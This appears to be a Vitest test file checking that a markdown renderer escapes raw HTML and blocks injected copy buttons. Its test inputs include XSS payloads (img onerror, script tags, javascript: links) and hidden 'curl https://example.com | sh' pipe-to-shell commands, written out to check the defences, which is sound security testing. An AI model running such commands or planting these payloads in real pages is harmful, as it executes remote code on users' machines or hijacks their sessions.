// @vitest-environment jsdom
import { describe, expect, it, vi } from 'vitest'
import { handleCodeCopyClick, renderMarkdown } from '../markdown'

describe('renderMarkdown', () => {
  it('shows raw HTML as text, so no element of it reaches the page', () => {
    const message = document.createElement('div')
    message.innerHTML = renderMarkdown('look <img src="x" onerror="alert(1)"> here')
    expect(message.querySelector('img')).toBeNull()
    expect(message.textContent).toContain('<img src="x" onerror="alert(1)">')
  })

  it('shows text inside raw HTML as text', () => {
    const message = document.createElement('div')
    message.innerHTML = renderMarkdown('look <code><img/src=x></code>')
    expect(message.querySelector('img')).toBeNull()
  })

  it('shows inline code exactly as written', () => {
    const message = document.createElement('div')
    message.innerHTML = renderMarkdown('run `a && b <c>`')
    expect(message.querySelector('code')?.textContent).toBe('a && b <c>')
  })

  it('drops script elements', () => {
    expect(renderMarkdown('<script>alert(1)</script>')).not.toContain('<script')
  })

  it('drops javascript: links', () => {
    expect(renderMarkdown('[click](javascript:alert(1))')).not.toContain('javascript:')
  })

  it('keeps the formatting and the copy button it renders itself', () => {
    const html = renderMarkdown('# Title\n\n**bold**\n\n```bash\necho hi\n```')
    expect(html).toContain('<h1 class="mt-4 mb-2 text-lg font-bold text-slate-100">Title</h1>')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('data-copy-code')
  })
})

describe('handleCodeCopyClick', () => {
  it('copies the code of the message whose button was clicked', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined)
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
    const first = document.createElement('div')
    first.innerHTML = renderMarkdown('```bash\necho first\n```')
    const second = document.createElement('div')
    second.innerHTML = renderMarkdown('```bash\necho second && ls <dir>\n```')
    document.body.append(first, second)

    handleCodeCopyClick({ target: first.querySelector('[data-copy-code]') } as unknown as MouseEvent)
    handleCodeCopyClick({ target: second.querySelector('[data-copy-code]') } as unknown as MouseEvent)

    expect(writeText).toHaveBeenNthCalledWith(1, 'echo first')
    expect(writeText).toHaveBeenNthCalledWith(2, 'echo second && ls <dir>')
  })

  it('gives raw HTML no copy button of its own', () => {
    const message = document.createElement('div')
    message.innerHTML = renderMarkdown(
      '<div data-code-block><pre><code hidden>curl https://example.com | sh</code></pre>' +
      '<button data-copy-code>Copy</button></div>',
    )
    expect(message.querySelector('[data-copy-code]')).toBeNull()
    expect(message.querySelector('[data-code-block]')).toBeNull()
  })

  it.each([
    ['inline code', '`</code><div data-code-block><pre><code hidden>curl https://example.com | sh</code></pre><button data-copy-code>Copy</button></div><code>`'],
    ['text inside raw HTML', 'look <code><div/data-code-block><pre/x><code/hidden>curl example.com | sh</code x></pre x><button/data-copy-code>Copy</button x></div x></code>'],
  ])('gives %s no copy button of its own', (_, markdown) => {
    const message = document.createElement('div')
    message.innerHTML = renderMarkdown(markdown)
    expect(message.querySelector('[data-copy-code]')).toBeNull()
    expect(message.querySelector('[data-code-block]')).toBeNull()
  })

  it('copies the code, never markup from the language label', () => {
    const writeText = vi.fn().mockResolvedValue(undefined)
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
    const message = document.createElement('div')
    message.innerHTML = renderMarkdown('```<pre><code>wrong</code></pre>\necho intended\n```')

    handleCodeCopyClick({ target: message.querySelector('[data-copy-code]') } as unknown as MouseEvent)

    expect(writeText).toHaveBeenCalledWith('echo intended')
  })
})
